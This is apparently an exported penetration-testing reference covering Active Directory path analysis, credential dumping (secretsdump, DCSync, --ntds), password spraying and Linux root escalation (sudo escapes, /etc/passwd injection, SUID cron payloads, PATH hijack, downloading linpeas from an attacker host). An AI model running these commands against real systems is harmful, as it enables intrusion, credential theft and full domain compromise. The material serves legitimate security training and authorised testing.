items: Delete the ccache files created by noPac and gettgtpkinit; they are live credentials.
Remove the computer account noPac created if the delete failed during the run.
Stop the SMB share and the handler when PrintNightmare is finished.
Note the certificate issued by the CA and any template weakness you exploited; those are findings, not just steps.
Record what you changed on the target so the client can revert it.

pages.title: BloodHound — Collection and Path Analysis
pages.description: collect AD relationship data once, then use it to answer a single question — **what is the shortest path from a principal I control to Domain Admin?** — and exploit the first edge on that path.

rows: you have domain credentials and can reach the DC
you are already on a domain-joined box; richest session data

blocks.text: All three produce the same graph. Collect **once per engagement**; re-collecting after every change wastes time.

fields.lookFor: `INFO: Found AD domain`, `INFO: Done in 00M 42S`, and a set of <code>.json files in the current directory.
fields.decision: collection completes → Step 04. DNS errors → add `-dc <DOMAIN_CONTROLLER_IP>` or point `-ns` at the DC. Access denied on sessions → Step 02 or `-c DCOnly`.
fields.mistake: running with `-c All` from a host that cannot reach every member server — session collection fails and you waste minutes. Use `-c DCOnly` for a fast, reliable baseline, then add `Session` later.
fields.evidence: the JSON file list and the collector's log.

fields.lookFor: `BloodHound` in the nxc output and JSON files written to the working directory.
fields.decision: works → Step 04. `LDAP signing` or `channel binding` errors → use LDAPS or fall back to Step 01.
fields.mistake: forgetting `-c All` — without it you may get only a partial collection.
fields.evidence: the nxc output and the resulting files.

commands.code:
SharpHound.exe -c All --zipfilename loot.zip
SharpHound.exe -c DCOnly --zipfilename dc.zip

fields.lookFor: `loot.zip` in the current directory.
fields.decision: AV removes SharpHound → use `bloodhound-python` from Kali instead of fighting the AV.
fields.next: transfer the ZIP to Kali and Step 04.
fields.mistake: running `-c All` from a workstation with no privileges — session collection is noisy and may be blocked by the domain. `DCOnly` is safer for a first pass.
fields.evidence: the ZIP filename and collection log.

commands.code:
ls -la *.json *.zip 2>/dev/null
python3 -c "import json,glob; [print(f, len(json.load(open(f))['data'])) for f in glob.glob('*_users.json')]"
sudo neo4j start
bloodhound --no-sandbox

fields.lookFor: a non-trivial user/computer count, then a successful import in the BloodHound GUI (Database Info shows the domain).
fields.decision: counts look sane → Step 05. Empty or tiny counts → re-collect (Step 01) with the DC as `-dc`.
fields.mistake: importing a ZIP that contains only `computers.json`. Check that users, groups and `gpos` are present before trusting the graph.
fields.evidence: the file list and the database info panel.

fields.lookFor: a path of 2-6 hops; the edges are the exploitation steps.
fields.decision: a path exists → read the **first** edge from your user and go to Section C. No path → check `Domain Users` → `Domain Admins` via nested groups, and re-collect.
fields.mistake: reading the whole path and trying to exploit the last hop. You must walk it in order, starting from the only principal you control.
fields.evidence: a screenshot of the path with the edge labels.

blocks.title: Mark what you own

fields.lookFor: every credential you have collected marked owned — users, computers, and groups.
fields.decision: multiple owned principals → query the shortest path from **any** owned node:
fields.mistake: marking only the first user. The account you got from a share may be the better starting point.
fields.evidence: the owned-node list.

blocks.notes: Right-click the principal you control → **Mark as Owned**. Then re-run Step 05; owned nodes get a skull and shortcut the analysis.

commands.code:
MATCH (u:User {hasspn:true}) RETURN u.name
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
MATCH (c {unconstraineddelegation:true}) RETURN c.name
MATCH (u:User)-[:HasSession]->(c:Computer) WHERE u.admincount=true RETURN u.name, c.name
MATCH p=(a)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword]->(b) RETURN p

fields.lookFor: Kerberoastable service accounts, AS-REP roastable users, unconstrained delegation hosts, and DA sessions on member servers.
fields.decision: an ACL edge from an owned principal → Section C. A DA session → target that computer with the credential you hold.
fields.mistake: chasing a Kerberoastable account with no path to DA. Check the path first, then crack.
fields.evidence: the query results.

commands.code:
net rpc password "<TARGET_USER>" -U "<DOMAIN>/<USERNAME>%<PASSWORD>" -S <DOMAIN_CONTROLLER_IP>
# alternative, if net rpc is unavailable
impacket-changepasswd -altuser '<DOMAIN>/<USERNAME>' -altpass '<PASSWORD>' -reset -newpass '<NEW_PASSWORD>' '<DOMAIN>/<TARGET_USER>'@<DOMAIN_CONTROLLER_IP>

fields.lookFor: `Password changed` or a successful bind.
fields.decision: success → authenticate as `<TARGET_USER>` and re-run Step 05 with the new owned node.
fields.mistake: changing a password that is in use by a service or a live session, breaking the box. Prefer accounts the path needs, not critical service accounts.
fields.evidence: the command and the successful authentication as the target.

blocks.title: GenericAll on a user

commands.code:
# GenericAll includes ResetPassword: this is the Step 08 command, reused
net rpc password "<TARGET_USER>" -U "<DOMAIN>/<USERNAME>%<PASSWORD>" -S <DOMAIN_CONTROLLER_IP>

fields.lookFor: `Password changed`, then a fresh login as `<TARGET_USER>`.
fields.decision: reset succeeds → you own the target; re-run Step 05 and mark the new account owned. If the target is a DA, stop and collect proof.
fields.next: Step 06 (re-mark owned and re-collect) or Step 08 if the reset is refused.
fields.mistake: assuming GenericAll always means "take over the account immediately". Check whether the account is `Account is sensitive and cannot be delegated` or protected by `AdminSDHolder`.
fields.evidence: the ACL edge, the reset, and the login.

blocks.notes: GenericAll on a user includes the right to reset their password — same action as **Step 08**, with no extra tooling. Use the command below; it is the Step 08 reset.

fields.lookFor: no error, then group membership confirmed with `net rpc group members`.
fields.decision: works → re-collect or refresh BloodHound; your new group may open a path.
fields.mistake: adding yourself to `Domain Admins` when the edge is on a lesser group — read the edge target. Adding to a privileged group is loud; do it only when it is the path.
fields.evidence: the membership before and after.

fields.lookFor: `Owner changed` then `DACL modified` — you are now owner **and** have FullControl, which turns WriteOwner into GenericAll.
fields.decision: owneredit succeeds but dacledit fails → grant yourself only the specific right you need (e.g. `ResetPassword`).
fields.next: Step 08 or Step 10 depending on the target type.
fields.mistake: stopping after taking ownership. Ownership alone gives you the **ability** to change the DACL — you still have to do it.
fields.evidence: the ACL before/after and the action that followed.

fields.lookFor: `DACL modified` then the `krbtgt` hash from secretsdump.
fields.decision: DCSync rights granted → you have domain-wide credential access. This is the end of the chain.
fields.mistake: writing DCSync on the wrong object. The target must be the **domain root** (`DC=…`), not a user.
fields.evidence: the DACL change and the dump.

pages.title: Post-Exploitation & Lateral Movement — NetExec and Impacket
pages.description: once you hold a credential, use NetExec to **prove where it works** and Impacket to **act** on it. nxc enumerates and validates across SMB, WinRM, LDAP, MSSQL and RDP; Impacket gives you an interactive shell, remote execution, and credential dumping.

rows: Test one credential against many hosts

blocks.text: **Rule of thumb:** nxc first (fast, quiet, tells you what is possible), Impacket second (does the thing). Do not open an interactive shell before you know which hosts accept the credential.

fields.lookFor: version 1.5.x and the protocol list: `wmi, ftp, rdp, ldap, ssh, mssql, smb, nfs, vnc, winrm`.
fields.decision: flags differ between versions — check `--help` rather than copying a blog.
fields.mistake: using `nxc smb --sessions`. In 1.5.x that flag is gone; the equivalent is `--loggedon-users`.
fields.evidence: the version string.

fields.lookFor: `[+] <DOMAIN><USERNAME>:<PASSWORD>` and `(Pwn3d!)` — Pwn3d means local admin, not just valid.
fields.decision: Pwn3d → Step 07 or Impacket execution. Valid but not Pwn3d → Step 03 (shares), Step 04 (users), Step 10 (MSSQL). `STATUS_LOGON_FAILURE` → wrong credential or wrong domain; try `--local-auth`.
fields.mistake: treating a valid login as admin. Read the `(Pwn3d!)` marker; without it you cannot use `psexec`.
fields.evidence: the nxc line with the credential and Pwn3d status.

fields.lookFor: `READ`/`WRITE` on non-standard shares, SYSVOL/NETLOGON (domain policy, scripts, `Groups.xml` with `cpassword`).
fields.decision: WRITE on a share that a privileged process reads → plant a file (see SMB page). READ on SYSVOL → hunt GPP passwords.
fields.mistake: ignoring SYSVOL because it is "just policies". GPP `cpassword` is a classic domain credential.
fields.evidence: the share list with permissions.

fields.lookFor: a Domain Admin logged on to a member server (lateral target), lockout threshold, password length, users with `Description` set.
fields.decision: DA session found → target that host. `--pass-pol` shows the lockout threshold — respect it during spraying.
fields.next: Step 05 (only if the policy permits) or Step 08.
fields.mistake: spraying before reading `--pass-pol`. One attempt per account is safe; ten is a lockout.
fields.evidence: the logged-on user list and the policy block.

fields.lookFor: a small number of `[+]` hits among many failures.
fields.decision: a hit → Step 02 with that account. Zero hits → stop after one round; do not iterate variants.
fields.mistake: spraying a locked-out account or exceeding the threshold. One password, one attempt per user, then wait.
fields.evidence: the successful line and the policy that made it safe.

fields.lookFor: the same `Pwn3d!` marker without a plaintext password.
fields.decision: works → you can use `impacket-psexec -hashes:<NTHASH>`. Fails → the hash is for a different account or the host requires Kerberos.
fields.mistake: supplying `LM:NT`. nxc wants the NT part; with Impacket use `-hashes:<NTHASH>` (empty LM).
fields.evidence: the nxc line showing authentication with the hash.

commands.code:
nxc smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -x "whoami"
nxc smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -X "Get-Process | Select-Object -First 5"
nxc smb <TARGET_IP> -u administrator -p <PASSWORD> --local-auth -x "whoami"

fields.lookFor: command output returned inline, and `nt authority\system` if the account is local admin.
fields.decision: output returns → you have code execution; move to credential dumping (Step 12). Error `STATUS_ACCESS_DENIED` → credential is valid but not admin.
fields.mistake: forgetting `--local-auth` for local accounts — otherwise nxc authenticates to the domain and fails.
fields.evidence: the command and its output.

fields.lookFor: `(Pwn3d!)` — WinRM access usually means administrative group membership.
fields.decision: Pwn3d → `evil-winrm` (Step 20). Port closed (5985/5986) → use SMB/WMI instead.
fields.mistake: assuming WinRM is open because SMB is. It must be enabled and the account must be in `Remote Management Users` or `Administrators`.
fields.evidence: the nxc winrm result.

fields.lookFor: account descriptions containing passwords, `userAccountControl` flags (no preauth → AS-REP roastable), `servicePrincipalName` (Kerberoastable).
fields.decision: SPN found → Kerberoast (AD page). No preauth → AS-REP roast. Both → BloodHound for the path.
fields.mistake: querying a member server instead of the DC. LDAP lives on the DC (389/636).
fields.evidence: the user/group listing.

commands.code:
nxc mssql <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -q "SELECT @@version"
nxc mssql <TARGET_IP> -u sa -p <PASSWORD> --local-auth -q "SELECT name FROM sys.databases"

fields.lookFor: version, database names, and whether `xp_cmdshell` is enabled.
fields.decision: `sysadmin` role → enable `xp_cmdshell` and execute OS commands. Low-priv SQL login → look for impersonation (`EXECUTE AS LOGIN`).
fields.mistake: using domain auth against a SQL instance that only accepts SQL logins — add `--local-auth`.
fields.evidence: the version query output.

commands.code:
nxc rdp <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN>
nxc ftp <TARGET_IP> -u <USERNAME> -p <PASSWORD>
nxc ssh <TARGET_IP> -u <USERNAME> -p <PASSWORD>
nxc vnc <TARGET_IP> -u <USERNAME> -p <PASSWORD>

fields.lookFor: which service accepts the credential. RDP success → `xfreerdp`; SSH success → shell; VNC success → desktop.
fields.decision: one protocol works but SMB does not → the account is local to that service, not a domain admin.
fields.mistake: concluding "credential invalid" after testing only SMB. Test every exposed protocol.
fields.evidence: the result per protocol.

commands.code:
nxc smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --sam
nxc smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --lsa
nxc smb <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> --ntds

fields.lookFor: local SAM hashes, LSA secrets (service account passwords, cached domain creds), and `--ntds` returning `krbtgt` (full domain compromise).
fields.decision: hashes obtained → Step 06/19 (pass-the-hash). `--ntds` works → you are Domain Admin; stop escalating and start documenting.
fields.mistake: running `--ntds` without DA rights and assuming the tool is broken. It needs DCSync or local admin on the DC.
fields.evidence: the dump output (redact hashes in the report).

fields.lookFor: a `C:\Windows\system32>` prompt running as `nt authority\system` — or a `SYSTEM` shell.
fields.decision: works → fastest SYSTEM shell. Fails with `STATUS_ACCESS_DENIED` → the account is not local admin. Fails with `service` errors → AV removed the binary; use wmiexec instead.
fields.mistake: using psexec on a host where you are only a valid user. psexec requires local admin and installs a service — it is loud and leaves artefacts.
fields.evidence: `whoami` output from the shell.

fields.lookFor: a `C:\>` prompt where each command runs through WMI. Output is captured; no interactive `cd` persistence.
fields.decision: works → preferred over psexec. Needs local admin, but installs no service binary, so it survives most AV.
fields.next: Step 17 (dump) or Step 20 (if WinRM is open).
fields.mistake: expecting `cd` to persist. Each line is a separate process — use full paths.
fields.evidence: `whoami` and `hostname` from the session.

fields.lookFor: command output without a service binary being uploaded.
fields.decision: psexec is blocked by AV and wmiexec is unavailable → smbexec is the third option. Still creates a service, so it is not invisible.
fields.mistake: assuming "no file" means "no artefacts". The service creation is logged.
fields.evidence: the command output.

fields.lookFor: the output of the command, executed by the Task Scheduler as SYSTEM.
fields.decision: useful when the service control manager is monitored but tasks are not.
fields.next: use it for one-shot commands, not interactive shells.
fields.mistake: expecting a shell. atexec runs one command and exits.
fields.evidence: the command output.

commands.code:
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
impacket-secretsdump -hashes :<NTHASH> <DOMAIN>/<USERNAME>@<TARGET_IP>
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL

fields.lookFor: `[+] <DOMAIN><USER>:<RID>:<LM>:<NT>:::` lines, `[*] Cleaning up...` and LSA secrets such as `DefaultPassword`.
fields.decision: local admin on a member server → local SAM/LSA. Domain Admin → Step 18 for the whole domain.
fields.next: crack weak hashes, pass the strong ones.
fields.mistake: expecting domain hashes from a member server. Without `-just-dc` you only get local secrets.
fields.evidence: the dump, plus the host it came from.

fields.lookFor: `krbtgt` and every domain account hash.
fields.decision: requires `Replicating Directory Changes` rights (Domain Admin, or delegated). No rights → `ERROR_DS_DRA_ACCESS_DENIED`.
fields.next: pass-the-hash (Step 19) or forge a golden ticket (advanced).
fields.mistake: running DCSync as a plain domain user and concluding the DC is patched. It is a permissions error, not a vulnerability.
fields.evidence: the krbtgt line (redacted) and the account used.

fields.lookFor: authentication without the plaintext password, or with a ticket instead of a password.
fields.decision: hash works → use it everywhere. Kerberos-only environment → get a TGT and use `-k -no-pass`.
fields.next: lateral movement to the next host.
fields.mistake: using `-hashes <NTHASH>` with no leading colon. Impacket expects `LM:NT`; `-hashes:<NTHASH>` is the safe form.
fields.evidence: the successful execution and the credential type used.

fields.lookFor: a PowerShell prompt with `*Evil-WinRM*` in the prompt.
fields.decision: WinRM open and the account is admin → best interactive shell: upload/download, `Invoke-Binary`, `menu`.
fields.mistake: using it when 5985 is closed. Check with nxc winrm (Step 08) first.
fields.evidence: the prompt and `whoami`.

rows: Assume DA — it is local admin
Retry psexec with the same account
Try to crack a strong hash first
Use psexec on a WinRM-only host
Spray NTLM hashes that cannot be used
Each line is a new process
Run against the DC with DA rights
You need DA or delegated rights
Sync time; point at the DC

blocks.text: **Pivoting variant.** Through a pivot, prefix everything with `proxychains4`:

Proxychains carries TCP only — use IP addresses (no DNS names) or add `--dns-server` for nxc, and expect Impacket to be slow. If the target must call back to you, the callback must reach the pivot, not Kali.

items: The nxc validation line showing the credential and `Pwn3d!`.
The exact Impacket command and its output.
`whoami` / `hostname` from every shell, to prove which host you were on.
The secretsdump output location (hashes redacted in the written report).
Which technique you used: password, hash, or ticket.
NetExec wiki: [https://www.netexec.wiki/](https://www.netexec.wiki/)
Impacket: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)
NetExec modules: [https://www.netexec.wiki/modules](https://www.netexec.wiki/modules)

Nothing was executed against a live domain for this page, so no step is **Lab Tested**. `--ntds`, DCSync and ticket-based authentication were not exercised here and are marked **Documented** / **Documented**.

pages.title: Passwords & Hashes — Complete Command Reference
pages.description: turn a captured hash into a usable credential — identify it, pick the right mode, crack it with the cheapest method that works, then reuse or spray it. Every mode below is the one you will actually meet on an exam box.

blocks.text: **Crack in this order:** fast hashes (NTLM, NetNTLMv2) with a wordlist → same with rules → masks only if the pattern is known. Kerberoast TGS is slow; budget time for it.

fields.lookFor: the hashcat mode in the output (`[+] Hashcat Mode: 1000`).
fields.decision: multiple candidates → match the **source** (SAM dump = NTLM, Responder capture = NetNTLMv2). Never guess from length alone.
fields.mistake: putting a NetNTLMv2 capture into `-m 1000`. It will never crack — the formats are different.
fields.evidence: the hashid output and the source of the hash.

commands.code:
mkdir -p <OUTPUT_DIR>/hashes
# one file per type: ntlm.txt, netntlmv2.txt, tgs.txt, asrep.txt, shadow.txt
wc -l <OUTPUT_DIR>/hashes/*.txt

fields.lookFor: a count per file that matches what you captured.
fields.decision: mixed file → split it first. hashcat stops at the first malformed line in some modes.
fields.mistake: appending every dump into one file, then wondering why half the hashes "fail". Separate by mode.
fields.evidence: the file list with line counts.

commands.code:
hashcat -m 1000 <HASH_FILE> <WORDLIST>
# with the usual rockyou
hashcat -m 1000 <HASH_FILE> /usr/share/wordlists/rockyou.txt

fields.lookFor: `Status……….Cracked` and the plaintext in the potfile.
fields.decision: not cracked after the wordlist → Step 08 (rules), then a targeted mask if you know the policy.
fields.mistake: cracking NTLM when you can **pass the hash** instead. If the hash grants admin, cracking is optional.
fields.evidence: the cracked line and the host that produced the hash.

fields.lookFor: a cracked challenge/response line (`USER::DOMAIN:challenge:response:blob`).
fields.decision: weak password → credential reuse. Strong → relay instead of cracking (SMB page), or move on.
fields.mistake: trying to pass a NetNTLMv2 hash. It is a challenge/response, not an NT hash — it cannot be used for pass-the-hash.
fields.evidence: the cracked credential and the capture source.

fields.lookFor: `$krb5tgs$23$*…` cracking to a service account password.
fields.decision: slow to crack → target accounts whose password policy is weak, or check if the account is in a path to DA first (BloodHound).
fields.mistake: cracking a TGS for an account that leads nowhere. Check the path before spending hour-long runs.
fields.evidence: the crack result and the SPN it belonged to.

fields.lookFor: `$krb5asrep$23$…` cracking quickly (AS-REP is usually faster than TGS).
fields.decision: cracked → log in without Kerberos pre-auth. Not cracked → the account may be low-value; move on.
fields.next: validate and enumerate as that user.
fields.mistake: confusing AS-REP (`18200`) with TGS (`13100`). The prefixes `$krb5asrep$` and `$krb5tgs$` tell you which.
fields.evidence: the cracked password and the user.

fields.lookFor: the username and plaintext after cracking.
fields.decision: readable `/etc/shadow` → crack offline; writable → replace root's hash instead (Linux PrivEsc page).
fields.mistake: cracking the whole shadow file including locked entries (`!`, `*`). Strip those lines first.
fields.evidence: the shadow line and the recovered password.

fields.prereqs: `hashcat` is installed, but rule files ship separately in `hashcat-data` and the set varies by distribution. `best64.rule` is **absent** on the build host used for this audit (`ls /usr/share/hashcat/rules` to see yours) — install `hashcat-data`, add the missing rule file, or point `-r` at one that exists. The mask line needs no rule file.
fields.lookFor: `Cracked` after the rules pass, where the plain wordlist failed.
fields.decision: rules fail → mask only if the policy implies a pattern (e.g. `Summer2026!`). Otherwise switch to another hash type.
fields.mistake: running a full `?a?a?a?a?a?a` mask — it is effectively infinite. Bound the mask to what the password policy allows.
fields.evidence: the rule/mask that worked.

fields.lookFor: John auto-detecting the format and printing `<PASSWORD> (<USER>)`.
fields.decision: hashcat has no mode for an exotic format → try John, which supports more formats out of the box.
fields.mistake: letting John auto-detect a shadow file with mixed formats; specify `--format=` explicitly.
fields.evidence: the `john --show` output.

blocks.title: Show and reuse what you cracked

fields.lookFor: `hash:plaintext` pairs.
fields.decision: a password works locally → check `sudo -l`/`su`; works on the domain → spray it (Step 11) and use it for lateral movement.
fields.next: Step 11 or the target's privesc page.
fields.mistake: forgetting `--show` and re-cracking hashes already in the potfile. Check the potfile before starting a long run.
fields.evidence: the `--show` output, saved to `<OUTPUT_FILE>`.

sections.title: Use a password without cracking
sections.rawTitle: D. Use a password without cracking

fields.lookFor: a small number of `[+]` successes across the user list.
fields.decision: hit → validate and enumerate. Zero → stop after one round; do not iterate variations.
fields.mistake: spraying without checking the domain policy (lockout threshold). One password, one attempt per user, then wait.
fields.evidence: the successful logins and the policy that made the spray safe.

commands.code:
hydra -L <USERLIST> -P <WORDLIST> smb://<TARGET_IP>
# single user, password list
hydra -l <USERNAME> -P <WORDLIST> smb://<TARGET_IP>

fields.lookFor: `[445][smb] host: … login: … password: …`.
fields.decision: a hit → validate with nxc. Hydra's SMB module is slow and unreliable against modern Windows — prefer `nxc smb -u user -p pass` loops for a handful of candidates.
fields.mistake: running a full brute force against a domain account. Lockout will end the engagement — spray, do not brute force.
fields.evidence: the successful login line.

rows: Relay, reuse elsewhere, or move on
Keep the GPU busy for hours
Cracks nothing on a known-good hash

blocks.text: **Pivoting variant.** Cracking is local — no target connectivity needed. Spraying and validation are not: through a pivot, use `proxychains4 nxc smb …` and keep concurrency low, or you will trip account lockout and proxy timeouts at the same time.

items: The hash source (dump command, host, user) for every file.
The mode used and the command line.
The cracked credential and the time it took (useful for the report).
The policy that justified a spray.
hashcat example hashes: [https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
John the Ripper: [https://www.openwall.com/john/](https://www.openwall.com/john/)
NetExec wiki: [https://www.netexec.wiki/](https://www.netexec.wiki/)

No cracking run was executed against a real hash for this page, so no step is **Lab Tested**; mask and rule behaviour is documented from hashcat's own syntax.

pages.title: Linux Privilege Escalation — Complete Command Reference
pages.description: go from a low-privilege shell to root by checking the five things that actually pay — sudo rights, SUID/SGID, capabilities, cron, and writable system files — **before** running any automated scanner.

blocks.text: Automated tools (LinPEAS, pspy) are excellent at **coverage** and terrible at **judgement**. They print 400 lines; the exam gives you 24 points for acting on the right one. Manual checks cost 15-20 minutes and usually find the intended path; the scanner is for when they don't.
**Order:** manual (Section A-F) → decision point (Section J) → automated (Section H-I) → kernel exploits last.

blocks.title: Who am I and what can I run?

fields.lookFor: group membership (sudo, adm, docker, lxd), `NOPASSWD` entries, `(ALL: ALL) ALL`, and the sudo version.
fields.decision: any `NOPASSWD` binary → Step 02. `(ALL: ALL) ALL` with a known password → `sudo su -`. Nothing → Step 03.
fields.mistake: running `sudo -l` and stopping at the password prompt. If sudo wants a password, you do not have passwordless rights — read the rest of the output anyway.
fields.evidence: the exact `sudo -l` output.

blocks.title: Turn a sudo right into a shell

commands.code:
sudo -l
# then match the binary against GTFOBins, e.g.
sudo vim -c ':!/bin/sh'
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo env /bin/sh
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

fields.lookFor: a `#` prompt.
fields.decision: the listed binary is not in GTFOBins → Step 03 (version bugs) or Step 12 (PATH hijack, if the sudo command calls another binary).
fields.mistake: assuming a sudo rule ending in a specific argument can't be escaped. Payloads usually go **after** the binary, and `;`/`-c` often allow a command.
fields.evidence: `id` as root in the same session where `sudo -l` was shown.

fields.lookFor: versions affected by known sudo bugs (e.g. CVE-2021-3156 "Baron Samedit", CVE-2019-14287 `-u#-1`).
fields.decision: version matches a public advisory → read the exploit's requirements before running it. Many need specific sudoers entries.
fields.next: exploit, or move to Section B.
fields.mistake: firing a sudo CVE because the version "looks old" without checking the distribution's backported patches.
fields.evidence: the version string plus the advisory.

fields.lookFor: anything outside the standard set (su, passwd, mount, ping, sudo). Unusual names are the lead.
fields.decision: a non-standard binary → Step 05. Only standard binaries → check versions and move to Section C.
fields.mistake: ignoring the **owner**. A SUID binary owned by root is interesting; one owned by a normal user is usually a leftover.
fields.evidence: the file list with `ls -l` for the interesting entries.

fields.lookFor: a `#` prompt, or a file-read primitive.
fields.decision: not in GTFOBins → `strings` it for embedded paths, check its version, or look for a shared-library hijack.
fields.mistake: running a SUID binary in a directory you control and losing the privilege because the binary drops it. Check `ls -l` for the `s` bit before and after.
fields.evidence: `id` showing `euid=0`.

fields.lookFor: SGID binaries in unusual groups (adm, disk), and root-owned scripts you can edit.
fields.decision: a root-owned script or binary you can write → replace its contents with a shell (keep a backup first).
fields.mistake: overwriting a file you need later. Copy it to `/tmp` first.
fields.evidence: the writable file and its new behaviour.

fields.lookFor: `cap_setuid+ep`, `cap_setgid+ep`, `cap_dac_read_search+ep`, `cap_sys_admin+ep`.
fields.decision: `cap_setuid` on an interpreter → Step 08. `cap_dac_read_search` → read `/etc/shadow` directly.
fields.mistake: looking only for SUID and forgetting capabilities, which are the modern equivalent and far less noisy.
fields.evidence: the `getcap` line.

commands.code:
# cap_setuid on python
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# cap_dac_read_search
<python3> -c 'print(open("/etc/shadow").read())'

fields.lookFor: a root shell or the shadow file.
fields.decision: root shell → proof. Shadow readable → crack hashes, then `su`.
fields.mistake: using the wrong interpreter path — `getcap` names the exact binary; use that one.
fields.evidence: `id` after the escape.

fields.lookFor: a job running as root that executes a script in a writable location, or a wildcard (`*`) in a directory you control.
fields.decision: writable script → Step 10. Wildcard in a writable dir → tar/rsync wildcard injection.
fields.mistake: only running `crontab -l` — that shows **your** jobs, not root's. `/etc/crontab` and `/etc/cron.d` matter more.
fields.evidence: the crontab line with its user field.

commands.code:
ls -la /path/to/script.sh
cp /path/to/script.sh /tmp/script.sh.bak
printf '#!/bin/sh
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
' > /path/to/script.sh
# wait for the next run
/tmp/rootbash -p

fields.lookFor: `/tmp/rootbash` appearing with the SUID bit.
fields.decision: the job is not writable → check whether its **directory** is (you can replace the script), or whether it calls a binary via a relative path.
fields.mistake: making the payload noisy or deleting the original script. Back it up; the box must stay usable.
fields.evidence: the modified script, the resulting SUID binary, `id` as root.

blocks.title: Check the files that define identity

fields.lookFor: `-rw-rw-rw-` on `/etc/passwd`, or any write bit for your user on shadow/sudoers.
fields.decision: passwd writable → Step 12. shadow readable → Step 13.
fields.mistake: assuming `/etc/passwd` is never writable. Misconfigured containers and lab builds do it often.
fields.evidence: the `ls -l` line.

commands.code:
openssl passwd -1 -salt x pwned
# append:  pwned:<HASH>:0:0:root:/root:/bin/bash
echo 'pwned:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
su pwned

fields.lookFor: a root shell from `su pwned`.
fields.decision: `su` asks for a password → the hash format is wrong; regenerate it.
fields.mistake: using a modern `$6$` hash in the passwd field — `su` expects the format the system's PAM is configured for; MD5 (`$1$`) is the safe default in labs.
fields.evidence: the new line and `id` after `su`.

commands.code:
cat /etc/shadow 2>/dev/null | head
# if writable, replace root's hash with a known one
openssl passwd -1 -salt x pwned

fields.lookFor: readable hashes → crack offline; writable → replace root's hash.
fields.decision: crack succeeds → `su root`.
fields.mistake: cracking with the wrong mode. Confirm the hash prefix (`$1$` MD5, `$6$` SHA-512) before choosing a hashcat mode.
fields.evidence: the hash line and the recovered password.

commands.code:
echo $PATH
# if a root cron/SUID program calls a binary without a full path:
mkdir -p /tmp/evil && printf '#!/bin/sh
/bin/sh
' > /tmp/evil/<BINARY>
chmod +x /tmp/evil/<BINARY>
export PATH=/tmp/evil:$PATH

fields.lookFor: a root-run program that calls `service`, `ps`, `ifconfig` etc. without `/usr/bin/`.
fields.decision: the program runs with a clean PATH → this fails; check for relative-path execution instead.
fields.mistake: assuming every cron job inherits your PATH. Most define their own; verify before spending time.
fields.evidence: the hijacked binary and the root shell it produced.

commands.code:
showmount -e <TARGET_IP>
mkdir -p /tmp/nfs && sudo mount -t nfs <TARGET_IP>:/<SHARE> /tmp/nfs -o nolock
sudo cp /bin/bash /tmp/nfs/rootbash && sudo chmod +s /tmp/nfs/rootbash
# on the target:
/tmp/nfs/rootbash -p

fields.lookFor: `no_root_squash` in `/etc/exports`, and a SUID bash you created from Kali.
fields.decision: the mount is read-only or squashes root → dead end; try writing a cron entry instead.
fields.next: run the binary on the target.
fields.mistake: creating the SUID file as your normal user — it must be created by **root** (hence `sudo` on Kali) for the bit to survive.
fields.evidence: the `showmount` output and `id` on the target.

fields.lookFor: database passwords in web configs, SSH keys, backup archives, a `.bash_history` containing `mysql -u root -p...`.
fields.decision: a password works for `su`/`sudo` → done. A key is found → try it against local users.
fields.mistake: only grepping for the word "password". Also search `pass`, `pwd`, `secret`, `token`, and connection strings.
fields.evidence: the file path and the exact line.

commands.code:
ps aux --sort=-%cpu | head -20
ss -tlnp
id
docker ps 2>/dev/null

fields.lookFor: a root process running from a writable directory, an internal service bound to [localhost](http://localhost), and membership of `docker` or `lxd`.
fields.decision: `docker` group → Step 18. Root process in a writable path → Step 10 logic.
fields.next: Step 18, or pivot to the internal service.
fields.mistake: ignoring [localhost](http://localhost)-only ports — they are usually the unreachable-from-outside admin service that grants root.
fields.evidence: the process/port list.

fields.lookFor: a shell with the host filesystem mounted at `/mnt`.
fields.decision: image not present and no internet → use an existing image (`docker images`).
fields.mistake: treating docker group membership as a minor finding. It is root, every time.
fields.evidence: `id` inside the chroot.

commands.code:
uname -a; cat /etc/os-release
searchsploit linux kernel $(uname -r | cut -d- -f1)

fields.lookFor: a kernel version matching a local privilege-escalation CVE (DirtyPipe, PwnKit via pkexec, OverlayFS).
fields.decision: a match → read the exploit fully; confirm the distro's patch level before running. **Prefer a configuration flaw over a kernel exploit** on the exam — a kernel panic costs the machine.
fields.next: run only after a snapshot/revert is acceptable.
fields.mistake: running DirtyPipe/PwnKit blind because the kernel "looks old". Check `pkexec --version` and the patch date.
fields.evidence: the version, the exploit name, and why you believed it applied.

commands.code:
# serve from Kali
python3 -m http.server 8000
# on target
wget http://<ATTACKER_IP>:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a 2>&1 | tee <OUTPUT_FILE>

fields.lookFor: the red/yellow 99% findings — SUID, capabilities, cron, <code>.ssh, credentials, kernel.
fields.decision: every red finding still needs manual confirmation. LinPEAS reports possibilities, not vulnerabilities.
fields.next: verify the top finding by hand, then exploit it.
fields.mistake: pasting LinPEAS output into a report as if it were a finding. The report needs the command you ran **after** it.
fields.evidence: the scan output (as an appendix) plus your manual confirmation.

fields.lookFor: recurring root commands with relative paths, writable scripts, or credentials in arguments.
fields.decision: a repeating job appears → Step 10.
